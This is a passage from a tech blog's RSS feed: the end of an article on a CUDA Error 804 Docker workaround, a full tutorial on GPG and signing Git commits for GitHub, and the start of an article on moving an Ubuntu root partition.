class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;import torch; print(torch.rand(2, 3).cuda())&quot;</span>]</span></span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK10" data-gk-title="Dockerfile_bad (new)"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">FROM</span> nvidia/cuda:<span class="hljs-number">11.3</span>.<span class="hljs-number">0</span>-cudnn8-devel-ubuntu20.<span class="hljs-number">04</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> apt update -y &amp;&amp; apt install -y python3 python3-pip</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> pip install torch==1.12.1+cu113 --extra-index-url https://download.pytorch.org/whl/cu113</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> apt purge cuda-compat-11-3 -y</span></span><br><span class="line"><span class="hljs-comment"># OR</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rfv /usr/local/cuda-11.3/compat/</span></span><br><span class="line"><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;python&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;import torch; print(torch.rand(2, 3).cuda())&quot;</span>]</span></span><br></pre></div></div></div><div class="gk-code hljs" data-gk-id="BLOCK11"><div class="gk-code-display"><pre><span class="line">$ make bad</span><br><span class="line">tensor([[0.0059, 0.6425, 0.2299],</span><br><span class="line">        [0.2306, 0.5954, 0.0226]], device=&#x27;cuda:0&#x27;)</span><br></pre></div></div><h1 id="epilogue-2">Epilogue</h1><p >This article elaborates the cause and workaround of CUDA Error 804 when NVIDIA GPUs working with docker. As preknowledge, I introduced the consistution of CUDA, the various categories of CUDA compatibility policies, and how the docker runtime deals with GPU driver. The culprit was discovered to be a bug or deficiency of libnvidia-container, which mishandled forward compatibility and minor version compatibility and was not yet resolved. As a workaround, one can remove the CUDA compat image inside the image to avoid forward compatibility being applied and light the minor version compatibility.</p><h1 id="references-9">References</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/361545761">PyTorch 的 CUDA 错误：Error 804: forward compatibility was attempted on non supported HW</a></li><li><a href="https://docs.nvidia.com/deploy/cuda-compatibility/">CUDA Compatibility</a></li><li><a href="https://docs.nvidia.com/cuda/cuda-toolkit-release-notes/index.html#id4">Table 3. CUDA Toolkit and Corresponding Driver Versions</a></li><li><a href="https://docs.nvidia.com/cuda/cuda-runtime-api/driver-vs-runtime-api.html#driver-vs-runtime-api">Difference between the driver and runtime APIs</a></li><li><a href="https://docs.nvidia.com/datacenter/tesla/drivers/index.html#cuda-drivers">CUDA Driver Lifecycles</a></li><li><a href="https://github.com/NVIDIA/nvidia-docker/issues/1515">The latest nvidia-container-toolkit caused inconsistent cuda version and 804 error. #1515</a></li><li><a href="https://github.com/NVIDIA/libnvidia-container/issues/138">Invalid libcuda.so.1 symlink under CUDA Enhanced Compatibility #138</a></li></ul><div class="footnotes"><ol><li class="footnote" id="fn:1"><a href="https://docs.nvidia.com/cuda/cuda-toolkit-release-notes/index.html#id4">https://docs.nvidia.com/cuda/cuda-toolkit-release-notes/index.html#id4</a></li><li class="footnote" id="fn:2"><a href="https://docs.nvidia.com/deploy/cuda-compatibility">https://docs.nvidia.com/deploy/cuda-compatibility</a></li><li class="footnote" id="fn:3"><a href="https://docs.nvidia.com/cuda/cuda-toolkit-release-notes/index.html#id4">https://docs.nvidia.com/cuda/cuda-toolkit-release-notes/index.html#id4</a></li><li class="footnote" id="fn:4">Sometimes called “Enhanced Compatibility” in old context.</li><li class="footnote" id="fn:5">To be accurate, with <a href="https://docs.nvidia.com/deploy/cuda-compatibility/#application-considerations">some limitations</a> but should be ignorable for machine learning scenario.</li><li class="footnote" id="fn:6"><a href="https://docs.nvidia.com/deploy/cuda-compatibility/#forward-compatible-upgrade:~:text=Forward%20Compatibility%20is%20applicable%20only%20for%20systems%20with%20NVIDIA%20Data%20Center%20GPUs%20or%20select%20NGC%20Server%20Ready%20SKUs%20of%20RTX%20cards">https://docs.nvidia.com/deploy/cuda-compatibility/#forward-compatible-upgrade:~:text=Forward%20Compatibility%20is%20applicable%20only%20for%20systems%20with%20NVIDIA%20Data%20Center%20GPUs%20or%20select%20NGC%20Server%20Ready%20SKUs%20of%20RTX%20cards</a>.</li><li class="footnote" id="fn:7">RECALL: it’s part of UMD-KMD compatibility</li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/CUDA/">CUDA</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Docker/">Docker</category>
      
      
      <comments>https://i.hsfzxjy.site/diving-from-the-cuda-error-804-into-a-bug-of-libnvidia-container/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Modern Cryptography, GPG and Integration with Git(hub)</title>
      <link>https://i.hsfzxjy.site/gpg-and-github-interoperation/</link>
      <guid>https://i.hsfzxjy.site/gpg-and-github-interoperation/</guid>
      <pubDate>Mon, 02 Jan 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;&lt;a href=&quot;https://gnupg.org/&quot;&gt;GPG&lt;/a&gt; (the GNU Privacy Guard) is a complete and free implementation of the &lt;a href=&quot;https://www.openpgp.o</description>
        
      
      
      
      <content:encoded><![CDATA[<p ><a href="https://gnupg.org/">GPG</a> (the GNU Privacy Guard) is a complete and free implementation of the <a href="https://www.openpgp.org/">OpenPGP</a> standard. Based on various mature algorithms to select from, GPG acts as a convenient tool for daily cryptographic communication.</p><p >GPG has two primary functionalities: (1) it encrypts and signs your data for secure transfering and verifiable information integrity, and (2) it features a versatile key management system to construct and promote web of trust. GPG also has a well-designed command line interface for easy integration with other applications such as git.</p><p >This article is going to briefly elaborate some key concepts and usage of GPG, and then present demonstration to cryptographically sign git commits with the help of GPG.</p><h1 id="modern-cryptography-101">Modern Cryptography 101</h1><p >To understand how GPG or other privacy tools work, I should first introduce some basic ideas of modern cryptography. Let’s start with the two primary problems of secure communication, which includes <em>data encryption</em> and <em>data integrity/authenticity verification</em>.</p><h2 id="data-encryption">Data Encryption</h2><p >Peer-to-peer data encryption aims to prevent the message from being spied by a potential third party, especially when the two parties are communicating over a channel open to the public. Imagine Alice and Bob are mailing through pigeons, with the message unencrypted and clearly written on the paper. It is possible for a third person called Blake to intercept the pigeon, open the attached mailbox and read the message in it, without Alice and Bob knowing his existence.</p><p >Data encryption is introduced to defend against such attacks. For secure data exchange, Alice and Bob should agree on some kind of invertible message processing pipeline. The sender preprocesses (encrypts) the message before it attached to the pigeon, and the recipient performs the inverted process (decrypts) to read the clear message. In terms of cryptography, such pipeline is called a cryptographic algorithm or a <em>cipher</em>.</p><p >A cipher usually works with a key (or several keys). With the cipher fixed, the message encrypted with one key should only be decrypted with the same one. Modern ciphers are carefully designed to satisfy that Blake is hard to perform decryption without the key, even if he knows the full detail of the cipher. Under this assurance, Alice and Bob only have to choose a specific algorithm as cipher from the public list, and agree on the key before communication. This simplifies the process of negotiation, as they don’t have to discuss the sophisticated implementation of the cipher.</p><p >The currently available ciphers can be roughly categorized into two families, the <em>symmetric ciphers</em> and the <em>public-key ciphers</em>.</p><h2 id="symmetric-ciphers">Symmetric Ciphers</h2><p >Symmetric ciphers encrypt and decrypt messages using the same key. They went back far into human history. You might have heard of the <a href="https://en.wikipedia.org/wiki/Caesar_cipher">Caesar cipher</a> that replaces each plaintext letter with a different one a fixed number of places down the alphabet, which is a famous example of this category. For Caesar cipher, the key is the number of positions being shifted, like <code>3</code> for a tranformation of <code>A-&gt;D, B-&gt;E</code>.</p><p ><img loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4a/Caesar_cipher_left_shift_of_3.svg/330px-Caesar_cipher_left_shift_of_3.svg.png" alt=""></p><p >Symmetric cipher exposes several drawbacks in realistic usage. First, it provides no defense against the scenario of the key being stolen. If Blake somehow knows the key, he can both spy and forge the messages sent between Alice and Bob. Also, it would require $n(n-1)/2$ keys to achieve pairwise communication among $n$ persons, increasing the expense of key exchange and opportunity of leakage.</p><h2 id="public-key-ciphers">Public-key Ciphers</h2><p >By contrast, the public-key ciphers mitigate the problems by adopting a pair of keys instead of just one. A message encrypted by one key might only be decrypted with the other, and <em>vice versa</em>.</p><p >Practically we name one of them as <em>public key</em> and the other as <em>secret key</em>. The public key is published to whom we want to communicate with, while the secret key is kept locally and must only be known to ourselves. When Alice sends a message to Bob, the message is encrypted with Bob’s public key, and Bob uses his own private key to decrypt it on receiving.</p><p >Public-key ciphers reduce the adverse impact of public key leakage. An attacker with Alice’s public key in hand is unable to decrypt messages sent by others to her. Also, only $n$ keys have to be exchanged for $n$-person pairwise communication. The advantages overall result in lower key exchanging expense and inclined popularity of public-key ciphers in real life.</p><h2 id="digital-signatures-for-data-integrity">Digital Signatures for Data Integrity</h2><p >Ciphers solve the problem of data encryption, preventing the messages transfered from being spied by a third party, albeit they do not guarantee the integrity and authenticity of the data. Bob cannot tell whether the message he received is truly sent by Alice, since his public key is known by the world. Towards this purpose, the concept of <em>digital signatures</em> must be introduced.</p><p >Digital signatures employs the idea of hashing. In cryptography, hashing is a technique to generate digest for a piece of message. The digest must be almost unique, that is, two different messages should ideally have unequal value of digests. Also, it should guarantee that <em>no one</em> would recover the original plaintext from the digest <sup id="fnref:1"><a href="#fn:1">1</a></sup>.</p><p >Practically, Alice the sender would attach an encrypted digest as digital signature along with the message, by first applying a hash function and then encrypt with <em>Alice’s</em> own private key on the message. Anyone can decrypt the signature with Alice’s public key to verify that the message is truly signed by Alice and sent as-is. Since no one else knows Alice’s private key, the signature cannot be forged and hence is a mighty tool to assure authenticity.</p><h1 id="gpg">GPG</h1><p >The ciphers and digital signatures form the foundation of modern cryptography, upon which OpenPGP is proposed and GPG built as a high-level structure for convenient daily usage. This post will not explain the full details of GPG, but its basic idea and some of the frequently-used operations as tutorial.</p><p >Compared with the basic public-key system, OpenPGP further adopts a more sophisticated design. OpenPGP adopts a concept “user” to distinguish identities. A user is uniquely identified by his <em>real name</em> and <em>email</em>, and could own a primary key pair plus an optional collection of sub key pairs, each key pair with potentially different capabilities such as encryption or signing. The separation of keys’ responsibility enables one to revoke compromised keys without interfering the validity of others, leading to more flexible key management.</p><h2 id="key-generation">Key Generation</h2><p >To create a user and generate the key pair, we can use the <code>gpg --generate-key</code> command</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">$ gpg --generate-key</span><br><span class="line">gpg (GnuPG) 2.2.19; Copyright (C) 2019 Free Software Foundation, Inc.</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line"></span><br><span class="line">Note: Use &quot;gpg --full-generate-key&quot; for a full featured key generation dialog.</span><br><span class="line"></span><br><span class="line">GnuPG needs to construct a user ID to identify your key.</span><br><span class="line"></span><br><span class="line">Real name: FooBar</span><br><span class="line">Email address: foobar@foobar</span><br><span class="line">You selected this USER-ID:</span><br><span class="line">    &quot;FooBar &lt;foobar@foobar&gt;&quot;</span><br><span class="line"></span><br><span class="line">Change (N)ame, (E)mail, or (O)kay/(Q)uit? O</span><br><span class="line">We need to generate a lot of random bytes. It is a good idea to perform</span><br><span class="line">some other action (type on the keyboard, move the mouse, utilize the</span><br><span class="line">disks) during the prime generation; this gives the random number</span><br><span class="line">generator a better chance to gain enough entropy.</span><br><span class="line">gpg: key 417706EE02BA78E3 marked as ultimately trusted</span><br><span class="line">gpg: revocation certificate stored as &#x27;/home/hsfzxjy/.gnupg/openpgp-revocs.d/A100A3E7D94F665A2CB5A34D417706EE02BA78E3.rev&#x27;</span><br><span class="line">public and secret key created and signed.</span><br><span class="line"></span><br><span class="line">pub   rsa3072 2023-01-10 [SC] [expires: 2025-01-09]</span><br><span class="line">      A100A3E7D94F665A2CB5A34D417706EE02BA78E3</span><br><span class="line">uid                      FooBar &lt;foobar@foobar&gt;</span><br><span class="line">sub   rsa3072 2023-01-10 [E] [expires: 2025-01-09]</span><br></pre></div></div><p  class="par"> In this example, we’ve created a user with real name being <code>FooBar</code> and the email <code>foobar@foobar</code>. During the process, the program will prompt a dialog inquiring to enter a passphrase, which acts as the main guardian to access your secret key.</p><p >By default GPG generates two keys with different capabilities. The primary key prefixed with <code>pub</code> is for signing (<code>S</code>) and certifying (<code>C</code>), and a sub key prefixed with <code>sub</code> for encrypting (<code>E</code>). With <code>gpg --list-key</code> and <code>gpg --edit-key</code> commands, we can inspect the keys stored in our local database and edit one or more of them.</p><h2 id="basic-document-signing">Basic Document Signing</h2><p >When posting a document to the public, one would like to claim his issuance and expects no one could tamper the content, which can be achieved by digitally signing the document. Let’s check an example</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">$ echo &quot;hello world&quot; &gt; doc</span><br><span class="line">$ gpg --sign -u FooBar doc</span><br><span class="line">$ cat doc.gpg</span><br><span class="line">-- some binary data --</span><br></pre></div></div><p  class="par"> Here we create a file named <code>doc</code> with a string <code>&quot;hello world&quot;</code> as the content. <code>gpg --sign -u FooBar</code> signs and encrypts the given document with user <code>FooBar</code>‘s secret key, with the bundled result written to a new file <code>doc.gpg</code>. A person knowing <code>FooBar</code>‘s public key could verify its integrity with <code>--verify</code></p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">$ gpg --verify doc.gpg</span><br><span class="line">gpg: Signature made Tue 10 Jan 2023 09:02:03 PM CST</span><br><span class="line">gpg:                using RSA key A100A3E7D94F665A2CB5A34D417706EE02BA78E3</span><br><span class="line">gpg:                issuer &quot;foobar@foobar&quot;</span><br><span class="line">gpg: Good signature from &quot;FooBar &lt;foobar@foobar&gt;&quot; [ultimate]</span><br></pre></div></div><p  class="par"> or directly decrypt it with <code>--decrypt</code></p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line">$ gpg --decrypt doc.gpg</span><br><span class="line">hello world</span><br><span class="line">gpg: Signature made Tue 10 Jan 2023 09:02:03 PM CST</span><br><span class="line">gpg:                using RSA key A100A3E7D94F665A2CB5A34D417706EE02BA78E3</span><br><span class="line">gpg:                issuer &quot;foobar@foobar&quot;</span><br><span class="line">gpg: Good signature from &quot;FooBar &lt;foobar@foobar&gt;&quot; [ultimate]</span><br></pre></div></div><p  class="par"> If the content of <code>doc.gpg</code> be tampered, either of the above operations will fail.</p><p >GPG provides several flags to customize the generation of digital signature. For instance, flag <code>--clearsign</code> forces the signature to be separately attached after the plain text, which is more convenient for scenario like sending via e-mail</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line">$ gpg --clearsign -u FooBar -o- doc</span><br><span class="line">-----BEGIN PGP SIGNED MESSAGE-----</span><br><span class="line">Hash: SHA512</span><br><span class="line"></span><br><span class="line">hello world</span><br><span class="line">-----BEGIN PGP SIGNATURE-----</span><br><span class="line"></span><br><span class="line">iQHBBAEBCgAsFiEEoQCj59lPZlostaNNQXcG7gK6eOMFAmO9cJMOHGZvb2JhckBm</span><br><span class="line">b29iYXIACgkQQXcG7gK6eONlJAv2NULQR9aPfVfLj6rpKcRxvKDna2vnHhVg2Pyj</span><br><span class="line">I12lJfsF6kA4wMCkuJ5Kzk2OOLAPFHAh+Y5zYnx825vP7ckHBvhYfwfkKmE7wpqN</span><br><span class="line">ptX/ij0TDtp71Nq/oabBOMG1jYop0AwfCd3c5X27UyCGz6V5mdm3Dea4hILsQHld</span><br><span class="line">OsTLz7B6y8FmA4kT5mHOreVMI1cd3NPKKugSS0bSmSv/DN/Znlb72pbD0Hq0iLi/</span><br><span class="line">8LJAEuj2eEnUH5NyS1tY2GHBBUttMMGhgrNAxrBr445+ZGpczUJVYVzS1tdTWwSZ</span><br><span class="line">uzHrD0CWtiIcFe6Au/pzDmbq+EJ9fF7YECCfc0m/QANGUNJydXs18c7IfrT9Awze</span><br><span class="line">UJwYNKxGkXipVfGJECJZ4IvDiGiWDHv/QCZ+Bc0d6ZIu5nUcm4pC3q4RFm7jn/s9</span><br><span class="line">OnDiXaOgHjGiOKOR/Auofzr8gerq0uFFYcbiWots8hjLOlITO2iGMF3jzZk8ncdU</span><br><span class="line">QeT4711EQ4jzoy/5vfOCU7YuKh4=</span><br><span class="line">=gdHf</span><br><span class="line">-----END PGP SIGNATURE-----</span><br></pre></div></div><p  class="par"> With <code>-o&lt;filename&gt;</code> the output will be directed to <code>&lt;filename&gt;</code> instead of the default file name <code>doc.gpg</code>.</p><h2 id="document-encryption-and-trust-of-web">Document Encryption and Trust of Web</h2><p >Document signed using above method could be read by a wide audience, as long as they have user <code>FooBar</code>‘s public key. For a more limited usage where the document should be seen by specific recipient, say user <code>BazBaz</code>, we should encrypt it with <code>BazBaz</code>‘s public key.</p><p >The command <code>gpg --export -u BazBaz &gt; bazbaz.gpg</code> will dump all public keys of user <code>BazBaz</code> to file <code>bazbaz.gpg</code>, which can be distributed and imported by other users across the web. As an example, user <code>FooBar</code> imports the file to his local database</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line">(foobar) $ gpg --import bazbaz.gpg</span><br><span class="line">gpg: key 90D332C875527240: public key &quot;BazBaz &lt;bazbaz@bazbaz&gt;&quot; imported</span><br><span class="line">gpg: Total number processed: 2</span><br><span class="line">gpg:               imported: 2</span><br><span class="line">gpg:            new subkeys: 1</span><br><span class="line">gpg:         new signatures: 1</span><br><span class="line">(foobar) $ gpg --list-key</span><br><span class="line">pub   rsa3072 2023-01-10 [SC] [expires: 2025-01-09]</span><br><span class="line">      A100A3E7D94F665A2CB5A34D417706EE02BA78E3</span><br><span class="line">uid           [ultimate] FooBar &lt;foobar@foobar&gt;</span><br><span class="line">sub   rsa3072 2023-01-10 [E] [expires: 2025-01-09]</span><br><span class="line"></span><br><span class="line">pub   rsa3072 2023-01-10 [SC]</span><br><span class="line">      EE0B65758BBA776A2D0521B290D332C875527240</span><br><span class="line">uid           [ unknown] BazBaz &lt;bazbaz@bazbaz&gt;</span><br><span class="line">sub   rsa3072 2023-01-10 [E]</span><br></pre></div></div><p  class="par"> As we can see, the public key of <code>BazBaz</code> now shows up in the local list, but somehow the uid is labeled as <code>[unknown]</code> instead of <code>[ultimate]</code> as <code>FooBar</code> does.</p><p >The label <code>[unknown]</code> indicates that GPG will distrust any newly imported keys by default. OpenPGP comes with a multi-level trust model in defense against someone pretending as others’ identity, with <code>[unknown]</code> being the least trusted level. GPG will prompt us if we attempt to encrypt with an <code>[unknown]</code> key</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line">(foobar) $ gpg --sign --encrypt -u foobar --recipient bazbaz doc</span><br><span class="line">gpg: 9F85CD170E8B1269: There is no assurance this key belongs to the named user</span><br><span class="line"></span><br><span class="line">sub  rsa3072/9F85CD170E8B1269 2023-01-10 BazBaz &lt;bazbaz@bazbaz&gt;</span><br><span class="line"> Primary key fingerprint: EE0B 6575 8BBA 776A 2D05  21B2 90D3 32C8 7552 7240</span><br><span class="line">      Subkey fingerprint: 7E53 135B C569 F125 63D1  BEF2 9F85 CD17 0E8B 1269</span><br><span class="line"></span><br><span class="line">It is NOT certain that the key belongs to the person named</span><br><span class="line">in the user ID.  If you *really* know what you are doing,</span><br><span class="line">you may answer the next question with yes.</span><br><span class="line"></span><br><span class="line">Use this key anyway? (y/N)</span><br></pre></div></div><p  class="par"> This mechanism protects us from accidentally sending secret information to forged identity.</p><p >To tell GPG that the identity is really trusted, we can sign the public key to increase its trust level. <strong>Remember this must be done after you actually verify the identity via direct contact to that person.</strong> The <code>--sign-key</code> flag is used for this purpose</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line">(foobar) $ gpg -u foobar --sign-key bazbaz</span><br><span class="line">pub  rsa3072/90D332C875527240</span><br><span class="line">     created: 2023-01-10  expires: never       usage: SC</span><br><span class="line">     trust: unknown       validity: unknown</span><br><span class="line">sub  rsa3072/9F85CD170E8B1269</span><br><span class="line">     created: 2023-01-10  expires: never       usage: E</span><br><span class="line">[ unknown] (1). BazBaz &lt;bazbaz@bazbaz&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pub  rsa3072/90D332C875527240</span><br><span class="line">     created: 2023-01-10  expires: never       usage: SC</span><br><span class="line">     trust: unknown       validity: unknown</span><br><span class="line"> Primary key fingerprint: EE0B 6575 8BBA 776A 2D05  21B2 90D3 32C8 7552 7240</span><br><span class="line"></span><br><span class="line">     BazBaz &lt;bazbaz@bazbaz&gt;</span><br><span class="line"></span><br><span class="line">Are you sure that you want to sign this key with your</span><br><span class="line">key &quot;FooBar &lt;foobar@foobar&gt;&quot; (417706EE02BA78E3)</span><br><span class="line"></span><br><span class="line">Really sign? (y/N) y</span><br><span class="line">(foobar) $ gpg --list-key</span><br><span class="line">-- omit --</span><br><span class="line">pub   rsa3072 2023-01-10 [SC]</span><br><span class="line">      EE0B65758BBA776A2D0521B290D332C875527240</span><br><span class="line">uid           [  full  ] BazBaz &lt;bazbaz@bazbaz&gt;</span><br><span class="line">sub   rsa3072 2023-01-10 [E]</span><br></pre></div></div><p  class="par"> Now check the list again, we can see that the trust level of <code>BazBaz</code>‘s key changes from <code>[unknown]</code> into <code>[full]</code>.</p><p >OpenPGP’s trust model allows trust to propagate over the web, which eases the overhead of acknowledging key identities. In short, if user <code>A</code> trusts user <code>B</code>‘s identity, and user <code>B</code> has signed the public key of user <code>C</code>, then user <code>A</code> will transitively trust user <code>C</code>‘s identity. User <code>A</code> by this way has no need to individually verify the identity of all the imported keys and therefore enjoys an easier key management scheme.</p><h1 id="gpg-and-gitgithub-integration">GPG and Git/Github Integration</h1><p >GPG can be employed to claim the authenticity of your code by digitally signing your Git commits. Since Git itself uses email to distinguish authors, it’s possible to commit as other people’s identity. A <a href="http://www.jayhuang.org/blog/pushing-code-to-github-as-linus-torvalds/">story</a> described how one could push code to Github as the identity of Linus Torvalds. Such vulnerability can be exploited to disseminate malicious code or falsy information over the internet.</p><h2 id="integrate-gpg-with-git">Integrate GPG with Git</h2><p >The <a href="https://docs.github.com/en/authentication/managing-commit-signature-verification">Github Docs</a> has a series of posts as the guideline to commit signing and Github interoperation. To start with, we should tell Git about our signing key:</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line">$ gpg --list-secret-keys --keyid-format long</span><br><span class="line">sec   rsa3072/417706EE02BA78E3 2023-01-10 [SC] [expires: 2025-01-09]</span><br><span class="line">      A100A3E7D94F665A2CB5A34D417706EE02BA78E3</span><br><span class="line">uid                 [ultimate] FooBar &lt;foobar@foobar&gt;</span><br><span class="line">ssb   rsa3072/25E8CB9C4F68EE16 2023-01-10 [E] [expires: 2025-01-09]</span><br><span class="line">$ git config --global gpg.signingkey 417706EE02BA78E3!</span><br></pre></div></div><p  class="par"> With the <code>!</code> suffix the key precedes others and would always be used. We can alternatively configure to sign commits by default</p><div class="gk-code hljs" data-gk-id="BLOCK10"><div class="gk-code-display"><pre><span class="line">$ git config --global commit.gpgsign true</span><br></pre></div></div><p  class="par"> As demonstration, let’s switch to the workspace of a git repository and commit the code as usually did</p><div class="gk-code hljs" data-gk-id="BLOCK11"><div class="gk-code-display"><pre><span class="line">$ git add . &amp;&amp; git commit -m &#x27;signed commit&#x27;</span><br></pre></div></div><p  class="par"> Afterwards, we can inspect the history and see a digital signature attached</p><div class="gk-code hljs" data-gk-id="BLOCK12"><div class="gk-code-display"><pre><span class="line">$ git show --show-signature HEAD</span><br><span class="line">commit 57ac1c20094d0248a4a3e8676050f53f547a6afa (HEAD -&gt; hexo)</span><br><span class="line">gpg: Signature made Wed 11 Jan 2023 04:37:14 PM CST</span><br><span class="line">gpg:                using RSA key A100A3E7D94F665A2CB5A34D417706EE02BA78E3</span><br><span class="line">gpg: Good signature from &quot;FooBar &lt;foobar@foobar&gt;&quot; [ultimate]</span><br><span class="line">Author: hsfzxjy &lt;hsfzxjy@gmail.com&gt;</span><br><span class="line">Date:   Wed Jan 11 16:37:14 2023 +0800</span><br><span class="line"></span><br><span class="line">    signed commit</span><br><span class="line">-- omit --</span><br></pre></div></div><p  class="par"> which indicates the commit has been signed with success.</p><h2 id="integrate-gpg-with-github">Integrate GPG with Github</h2><p >GPG-signed commits can be highlighted with a <code>Verified</code> label displayed aside on Github, as showcased in the image below,</p><p  class="par"> <img loading="lazy" src="https://docs.github.com/assets/cb-4827/images/help/commits/gpg-signed-commit-verified-without-details.png" alt=""></p><p  class="par"> from which other people would know and trust the authenticity of this commit. Towards this effect, one should associate his GPG keys with Github profile. As instructed in <a href="https://docs.github.com/en/authentication/managing-commit-signature-verification/adding-a-gpg-key-to-your-github-account#adding-a-gpg-key">“Adding a GPG Key”</a>, the GPG public key is firstly exported from the command line in the text-form as</p><div class="gk-code hljs" data-gk-id="BLOCK13"><div class="gk-code-display"><pre><span class="line">$ gpg --armor --export foobar</span><br><span class="line">-----BEGIN PGP PUBLIC KEY BLOCK-----</span><br><span class="line"># GPG public key exported</span><br><span class="line">-----END PGP PUBLIC KEY BLOCK-----</span><br></pre></div></div><p  class="par"> which should be copied to the clipboard with the separators included. Then in the upper-right corner of any page on Github, click the profile avatar and select <code>Settings -&gt; Access -&gt; SSH and GPG keys -&gt; New GPG key</code>, paste the previously copied content into the box, and confirm with the <code>Add GPG Key</code> button, we should finish the association.</p><h1 id="conclusion-3">Conclusion</h1><p >GPG is a convenient software to do cryptography jobs and perform key management. While its history went back into old days and the UX might look wierd, it still stands as one of the de-facto standards in modern world. This article extensively explains the fundamental idea of modern cryptography on which GPG is based, followed with the demonstration of some GPG every-day usages, and further the instruction to integrate it with external tools/services such as Git or Github. Hopefully it will enlighten you about the approaches to carry out secure message exchange in daily life.</p><div class="footnotes"><ol><li class="footnote" id="fn:1">Even the performer of hashing cannot! This is how hashing differs from encryption.</li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Git/">Git</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Github/">Github</category>
      
      <category domain="https://i.hsfzxjy.site/tags/GPG/">GPG</category>
      
      
      <comments>https://i.hsfzxjy.site/gpg-and-github-interoperation/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Move the Root Partition of Ubuntu</title>
      <link>https://i.hsfzxjy.site/move-ubuntu-root-partition/</link>
      <guid>https://i.hsfzxjy.site/move-ubuntu-root-partition/</guid>
      <pubDate>Sat, 12 Nov 2022 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;A few days ago, I decided to shrink the footprint of the Windows system on my laptop and reallocate the freed-up disk space to Ubuntu, w</description>
        
      
      
      
      <content:encoded><![CDATA[<p >A few days ago, I decided to shrink the footprint of the Windows system on my laptop and reallocate the freed-up disk space to Ubuntu, which I use alongside it. Since I primarily rely on Ubuntu for programming and web browsing, I’ve rarely booted into the OEM-shipped Windows since purchasing the laptop. Windows occupies a significant portion of my SSD, and reclaiming that space allows for better use rather than letting it sit idle.</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">#gk:immersive</span><br><span class="line">(before)</span><br><span class="line">| --- Windows C: (256 GB) --- | --- Ubuntu / (256 GB) --- |</span><br><span class="line">(after)</span><br><span class="line">| --- Windows C: (120 GB) --- | --- Ubuntu / (392 GB) --- |</span><br></pre></div></div><p >As planned in the diagram above, 136 GB space would be reclaimed from the Windows C: partition and merged into Ubuntu’s root partition. While I’ve had experience resizing disk partitions before, this operation was a bit more risky–it required shifting the starting point of the Linux root partition. Since Linux depends on specific boot information stored in the <code>/boot/efi</code> directory, failing to update this information properly during the move could render the entire system unbootable.</p><p >To avoid any catastrophic consequences, I did some research in advance and followed a detailed guide I found on <a href="https://askubuntu.com/a/626609/706812">AskUbuntu</a>. It turns out the tweak involves two key steps. The first is resizing the partitions using <a href="https://gparted.org/">GParted</a>, just like I’ve done before with standard data partitions. Since GParted needs full access to the disk, it must be run from a separate USB device, allowing all internal partitions to be unmounted during the operation. Fortunately, this step is quite straightforward thanks to GParted’s intuitive GUI, which lets me make the necessary adjustments with just a few clicks.</p><p >Each disk partition is assigned a unique identifier called UUID – something like <code>b424102c-a5a6-489f-b0bd-0ea0fc3be7c3</code>. This UUID can change when a partition is moved or resized, which means the system’s bootloader configuration must be updated accordingly. The next step, then, is to rebuild the GRUB configuration to reflect the new UUID of the root partition. Before running <code>grub-install</code>, however, I needed to recreate the Ubuntu system’s directory hierarchy by mounting the necessary partitions and then using <code>chroot</code> to launch an interactive shell within that environment.</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">(gparted)$ <span class="hljs-built_in">mkdir</span> /tmp/mydir</span><br><span class="line">(gparted)$ mount /dev/nvme0n1p5 /tmp/mydir</span><br><span class="line">(gparted)$ mount --<span class="hljs-built_in">bind</span> /dev /tmp/mydir/dev</span><br><span class="line">(gparted)$ mount --<span class="hljs-built_in">bind</span> /proc /tmp/mydir/proc</span><br><span class="line">(gparted)$ mount --<span class="hljs-built_in">bind</span> /sys /tmp/mydir/sys</span><br><span class="line">(gparted)$ <span class="hljs-built_in">chroot</span> /tmp/mydir</span><br><span class="line"><span class="hljs-built_in">chroot</span>: failed to run <span class="hljs-built_in">command</span> ‘/bin/bash’: No such file or directory</span><br></pre></div></div><p >However, when I followed the guide, the <code>chroot</code> command failed with an error stating that <code>/bin/bash</code> could not be found. Upon inspecting the corresponding directory at 